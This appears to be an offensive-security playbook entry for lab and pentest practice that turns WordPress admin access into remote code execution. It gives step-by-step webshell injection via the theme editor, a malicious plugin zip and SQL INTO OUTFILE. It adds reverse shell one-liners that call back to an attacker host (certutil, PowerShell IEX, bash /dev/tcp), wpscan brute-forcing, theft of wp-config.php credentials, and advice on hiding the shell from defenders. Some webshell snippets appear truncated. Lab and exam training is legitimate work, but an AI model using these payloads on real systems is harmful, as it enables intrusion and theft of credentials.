title: WordPress Admin → Shell — Theme Editor, Plugin Upload, and DB Methods
body: Once you have WordPress admin credentials, getting RCE is a 5-minute exercise. WordPress's admin panel exposes multiple paths to code execution by design — themes are PHP, plugins are PHP, and the database stores PHP-serialized options. Three primary techniques, in order of reliability: 1. Theme Editor (Appearance → Theme Editor) — modify a PHP file directly 2. Plugin Upload — install a malicious plugin zip 3. Direct DB Write — INTO OUTFILE via wp_options or phpMyAdmin The theme editor path is the most reliable on lab boxes because it works on stock WordPress installs without any plugin/theme requirements. The plugin path works when theme editing is disabled (some hardened configs). DB write works when you have phpMyAdmin or DB credentials but not always WordPress admin. — PATH A: THEME EDITOR (RECOMMENDED) — REQUIREMENTS: - WordPress admin login - At least one editable theme installed (default themes are editable) - DISALLOW_FILE_EDIT not set in wp-config.php THE 404.PHP TECHNIQUE: Every WordPress theme has a 404.php template that fires on missing pages. It's the perfect injection target because: - Always editable in default themes - Predictable URL: /wp-content/themes//404.php - Triggered by visiting any non-existent page - Doesn't break the site if you make a mistake STEP-BY-STEP: 1. Log in to /wp-admin 2. Navigate: Appearance → Theme Editor 3. Right sidebar: select an active or inactive theme (twentytwenty, twentytwentyone, twentyfour, etc. — built-ins are safest) 4. Right sidebar: select '404 Template (404.php)' 5. Append the webshell at the bottom — KEEP existing content 6. Click 'Update File' 7. Trigger via direct URL WHY APPEND, NOT REPLACE: Replacing 404.php contents may break theme inheritance and trigger error pages. Appending preserves existing template behavior while adding your shell. The webshell only fires when you pass the right parameter — invisible to normal site traffic. THE WEBSHELL: The simplest reliable webshell: ";system($_REQUEST['cmd']);echo "";die;} ?> Trigger: http://target/wp-content/themes//404.php?cmd=whoami — PATH B: MALICIOUS PLUGIN ZIP — WHEN TO USE: - Theme editor disabled (DISALLOW_FILE_EDIT = true) - You want a more 'legitimate-looking' artifact - You need persistence (plugins survive theme switches) STEP-BY-STEP: 1. Build a zip with a single PHP file containing the webshell and a plugin header comment 2. Plugins → Add New → Upload Plugin 3. Choose your zip, click Install Now 4. Optional: Activate plugin (not required for webshell access) 5. Trigger via /wp-content/plugins//.php PLUGIN HEADER REQUIREMENT: Plugins MUST have a header comment or WordPress rejects the install: — PATH C: DATABASE INTO OUTFILE — WHEN TO USE: - You have MySQL/MariaDB credentials but not WordPress admin - phpMyAdmin is exposed and accessible - Theme/plugin paths are blocked REQUIREMENTS: - SQL FILE privilege on the user (default: root has it) - secure_file_priv empty or includes target directory - Web server can read from the path you write to THE TECHNIQUE: Write a PHP file directly to the web root via SQL: SELECT '' INTO OUTFILE 'C:/xampp/htdocs/sitename/shell.php'; Then access /shell.php?cmd=whoami — REVERSE SHELL DELIVERY (ALL PATHS) — Once any webshell is live, the goal is a reverse shell. WINDOWS TARGET: Webshell triggers PowerShell command: ?cmd=powershell -nop -c "IEX (IWR 'http://KALI/shell.ps1' -UseBasicParsing)" Or download EXE + execute: ?cmd=certutil -urlcache -f http://KALI/met.exe met.exe & met.exe LINUX TARGET: Webshell triggers bash reverse shell: ?cmd=bash -c 'bash -i >& /dev/tcp/KALI/443 0>&1' URL-encoded: ?cmd=bash%20-c%20'bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI%2F443%200%3E%261' — THE CANONICAL XAMPP+WORDPRESS LAB CHAIN — Recurring pattern on PG/HTB/OSCP boxes with XAMPP + WordPress: 1. Discover XAMPP + WordPress at // 2. Get admin creds (passwords.txt in SMB, or default install creds) 3. Login to //wp-admin 4. Appearance → Theme Editor → twentytwenty → 404.php 5. Append webshell, save 6. Trigger: /wp-content/themes/twentytwenty/404.php?cmd=whoami 7. Verify RCE → reverse shell with msfvenom EXE + certutil + nc listener This is exactly the chain Shenzi (PG Practice) follows. Memorize it.
cmd: # ── PATH A: THEME EDITOR ───────────────────────────── # ── A1: LOG IN AND NAVIGATE ────────────────────────── # Browser: http://target//wp-admin # Login with admin creds (from passwords.txt or wherever) # Then navigate: # Appearance → Theme Editor # Right sidebar 'Select theme to edit:' → choose any (twentytwenty common) # Right sidebar template list → '404 Template (404.php)' # ── A2: APPEND THE WEBSHELL ────────────────────────── # In the editor, scroll to the BOTTOM of 404.php and append: # # ";system($_REQUEST['cmd']);echo "";die;} ?> # # Click 'Update File' button at the bottom. # Or use the canonical simple-backdoor.php from Kali: cat /usr/share/webshells/php/simple-backdoor.php # Copy the block and paste at end of 404.php # ── A3: TEST THE WEBSHELL ──────────────────────────── # In browser or curl: curl 'http://$ip//wp-content/themes/twentytwenty/404.php?cmd=whoami' curl 'http://$ip//wp-content/themes/twentytwenty/404.php?cmd=dir' curl 'http://$ip//wp-content/themes/twentytwenty/404.php?cmd=hostname' # Different theme names to try if twentytwenty isn't there: # twentytwentyone, twentytwentytwo, twentytwentythree, twentytwentyfour # twentynineteen, twentyseventeen (older) # Or any custom theme listed in /wp-content/themes/ # Find available themes via the webshell: curl 'http://$ip//wp-content/themes/twentytwenty/404.php?cmd=dir+C:\xampp\htdocs\\wp-content\themes' # ── A4: REVERSE SHELL — WINDOWS TARGET ─────────────── # On Kali (terminal 1) — generate payload msfvenom -p windows/shell_reverse_tcp LHOST=KALI_IP LPORT=443 -f exe -o met.exe # Terminal 2: HTTP server python3 -m http.server 80 # Terminal 3: listener rlwrap -cAr nc -nlvp 443 # Trigger via webshell — download AND execute in one URL: WEBSHELL="http://$ip//wp-content/themes/twentytwenty/404.php" curl "${WEBSHELL}?cmd=certutil+-urlcache+-f+http://KALI_IP/met.exe+C:\Windows\Temp\met.exe" curl "${WEBSHELL}?cmd=C:\Windows\Temp\met.exe" # Shell hits listener within ~2 seconds # ── A5: REVERSE SHELL — LINUX TARGET ───────────────── # Linux variant — bash reverse shell directly via webshell WEBSHELL="http://$ip/wp-content/themes/twentytwenty/404.php" PAYLOAD='bash -c "bash -i >& /dev/tcp/KALI_IP/443 0>&1"' ENCODED=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$PAYLOAD'))") curl "${WEBSHELL}?cmd=${ENCODED}" # Or just paste manually: curl 'http://$ip/wp-content/themes/twentytwenty/404.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FKALI_IP%2F443%200%3E%261%22' # ══════════════════════════════════════════════════════ # PATH B: MALICIOUS PLUGIN UPLOAD # ══════════════════════════════════════════════════════ # ── B1: BUILD THE PLUGIN ZIP ───────────────────────── mkdir -p /tmp/wp-shell-plugin cat > /tmp/wp-shell-plugin/wp-shell.php <<'EOF' "; system($_REQUEST['cmd']); echo ""; die; } ?> EOF # Zip it (must contain the PHP file, NOT a parent folder) cd /tmp/wp-shell-plugin zip ../wp-shell.zip wp-shell.php # ── B2: UPLOAD VIA WP-ADMIN ────────────────────────── # Browser: WP admin → Plugins → Add New → Upload Plugin # Choose /tmp/wp-shell.zip → Install Now # Plugin uploads to /wp-content/plugins/wp-shell-plugin/wp-shell.php # (or /wp-content/plugins/wp-shell.zip if zip structure was different) # Activation NOT required — file is reachable via direct URL once uploaded # ── B3: TRIGGER ────────────────────────────────────── curl 'http://$ip//wp-content/plugins/wp-shell/wp-shell.php?cmd=whoami' # Same reverse shell delivery as Path A. # ══════════════════════════════════════════════════════ # PATH C: DATABASE INTO OUTFILE # ══════════════════════════════════════════════════════ # ── C1: VERIFY WRITE PRIVS ─────────────────────────── # In phpMyAdmin or mysql shell: SHOW VARIABLES LIKE 'secure_file_priv'; # Empty (NULL or '') = can write anywhere # Specific path = limited to that dir SELECT user, file_priv FROM mysql.user WHERE user = SUBSTRING_INDEX(USER(),'@',1); # file_priv = Y means SELECT INTO OUTFILE works # ── C2: WRITE THE WEBSHELL ─────────────────────────── # In MySQL/phpMyAdmin SQL tab: SELECT '' INTO OUTFILE 'C:/xampp/htdocs//dropped.php'; # Linux equivalent: SELECT '' INTO OUTFILE '/var/www/html/dropped.php'; # ── C3: TRIGGER ────────────────────────────────────── curl 'http://$ip//dropped.php?cmd=whoami' # ══════════════════════════════════════════════════════ # WPSCAN INTEGRATION (BEFORE LOGIN) # ══════════════════════════════════════════════════════ # If you don't yet have admin creds, run wpscan to find users + plugins: wpscan --url http://$ip/ \ --enumerate u,ap,at \ --plugins-detection aggressive \ --api-token # Brute-force admin once you have the username: wpscan --url http://$ip/ \ -U admin \ -P /usr/share/wordlists/rockyou.txt \ --password-attack xmlrpc-multicall # Or with a small custom list (for testing): echo 'admin FeltHeadwallWight357 password admin123' > /tmp/wp_passes.txt wpscan --url http://$ip/ -U admin -P /tmp/wp_passes.txt # ══════════════════════════════════════════════════════ # TROUBLESHOOTING # ══════════════════════════════════════════════════════ # 'You don't have permission to edit this file' in Theme Editor: # - DISALLOW_FILE_EDIT is set in wp-config.php — use Path B (plugin) # - Or check wp-config.php for the line: # define('DISALLOW_FILE_EDIT', true); # - If you can edit wp-config.php (via FTP, SMB, etc.), change to false # 404.php update saves but webshell URL returns 404: # - Wrong theme path — list themes via existing legit shell: # ls /var/www/html//wp-content/themes/ # - Active vs inactive theme matters — try both # - Permalink rewriting may strip the request — try with explicit # path: /wp-content/themes//404.php?cmd=... # Webshell returns blank page: # - PHP error suppressed — check Apache error log: # /var/log/apache2/error.log (Linux) # C:\xampp\apache\logs\error.log (Windows) # - PHP function disabled — check disable_functions in php.ini: # curl 'http://$ip//?cmd=phpinfo();' (if SSTI exists) # - Try alternate functions: passthru, exec, shell_exec, popen, proc_open # Plugin upload fails with 'Destination folder already exists': # - Plugin name conflict — rename the zip and PHP file # Plugin upload returns 500 error: # - Wrong zip structure — must be flat (PHP file at root, not in subfolder) # - WordPress requires the plugin header comment (Plugin Name: line) # Reverse shell hits listener but immediately disconnects: # - Architecture mismatch (x86 vs x64) — regenerate payload # - Antivirus killing the EXE — try msfvenom -e for evasion # - Try a python or PowerShell rev shell instead of EXE # ══════════════════════════════════════════════════════ # FAST POST-EXPLOIT FROM WEBSHELL (BEFORE FULL SHELL) # ══════════════════════════════════════════════════════ # Even before getting a reverse shell, the webshell lets you do recon: WEBSHELL="http://$ip//wp-content/themes/twentytwenty/404.php" # Identify yourself curl "${WEBSHELL}?cmd=whoami" curl "${WEBSHELL}?cmd=hostname" curl "${WEBSHELL}?cmd=ipconfig" 2>/dev/null # Windows curl "${WEBSHELL}?cmd=ifconfig" 2>/dev/null # Linux # Grab the WP config (DB creds + secrets) curl "${WEBSHELL}?cmd=type+C:\xampp\htdocs\\wp-config.php" # Windows curl "${WEBSHELL}?cmd=cat+/var/www/html/wp-config.php" # Linux # Quick XAMPP harvest curl "${WEBSHELL}?cmd=type+C:\xampp\passwords.txt" curl "${WEBSHELL}?cmd=dir+C:\xampp\htdocs" # Pre-stage the reverse shell payload curl "${WEBSHELL}?cmd=certutil+-urlcache+-f+http://KALI_IP/met.exe+C:\Windows\Temp\met.exe" # Then trigger when listener is ready: curl "${WEBSHELL}?cmd=C:\Windows\Temp\met.exe"
warn:
404.PHP IS THE SAFEST INJECTION TARGET — DON'T MODIFY index.php OR functions.php:
  Modifying index.php breaks the entire site immediately. Modifying
  functions.php may break it on next page load (PHP fatal errors). 404.php
  only fires on missing pages, so even if your shell has a syntax error
  the main site keeps working. Always pick 404.php first.

APPEND, DON'T REPLACE — KEEP THE ORIGINAL TEMPLATE:
  Wholesale replacing 404.php contents with just your webshell will work
  but creates an obviously-broken 404 page that defenders notice. Append
  your webshell to the END of the existing template. Normal 404 traffic
  looks normal, your webshell triggers only with the magic parameter.

DISALLOW_FILE_EDIT IS COMMON ON HARDENED SITES:
  Real-world WordPress hardening guides recommend setting:
    define('DISALLOW_FILE_EDIT', true);
  in wp-config.php. This disables the theme/plugin editor entirely.
  Lab boxes rarely have this. Real engagements often do — pivot to plugin
  upload (Path B) or DB write (Path C).

PLUGIN ZIP STRUCTURE MATTERS:
  WordPress expects: zip → containing folder OR direct PHP file at root.
  WRONG: zip with extra wrapper directory = upload fails
  RIGHT: zip wp-shell.php directly, OR zip a folder containing wp-shell.php
  And the PHP file MUST have the Plugin Name comment header.

ADMIN PANEL EDITS ARE LOGGED:
  WordPress logs admin actions to wp-login.log and the database
  (wp_user_meta tables). Real engagements: every theme/plugin edit you
  make is permanently visible to the next person who logs in. Lab boxes
  don't matter. Real engagements: document your changes for cleanup.

THEME EDITOR DOESN'T WORK ON ACTIVE THEMES (SOMETIMES):
  Some WordPress versions block edits to the currently-active theme via
  the editor. If you see an error, switch to a different theme first
  (Appearance → Themes → Activate a different one), edit it, switch back.
  Or pick a non-active theme to edit — your shell URL still works as long
  as the theme is installed.

XMLRPC.PHP BRUTE-FORCE IS FAST AND OFTEN UNRATE-LIMITED:
  When using wpscan to brute-force, --password-attack xmlrpc-multicall
  is significantly faster than wp-login.php attacks because xmlrpc.php
  doesn't have the same rate limiting. If you see xmlrpc.php returning
  200 on enumeration, prefer this attack vector.

CERTUTIL DOWNLOADS ARE SLOW BUT RELIABLE:
  certutil -urlcache works on every Windows from XP forward. PowerShell
  IWR is faster but blocked by some hardening configs. If you have a
  weird Windows version, certutil is the universal fallback.

DON'T LEAVE WEBSHELLS PERMANENTLY ON ENGAGEMENTS:
  After getting a reverse shell, REMOVE the webshell modification:
    Theme editor → 404.php → delete your appended block → Update File
  Or if you uploaded a plugin: Plugins → Deactivate → Delete
  Lab boxes: don't matter. Real engagements: webshells in production
  WordPress are massive incident-response findings.

THE THEME PATH USES 'themes' (PLURAL) — COMMON TYPO:
  /wp-content/themes/twentytwenty/404.php   ← correct
  /wp-content/theme/twentytwenty/404.php    ← WRONG (singular)
  Easy to mistype, returns 404, looks like the upload failed when actually
  it's a URL typo.

choices.label: RCE confirmed via webshell — get reverse shell
Got webshell — harvest XAMPP for next move
Theme editor disabled — try plugin upload
Got DB creds — write shell via INTO OUTFILE
Need credentials first — back to wpscan brute
Need to evaluate a public WP exploit
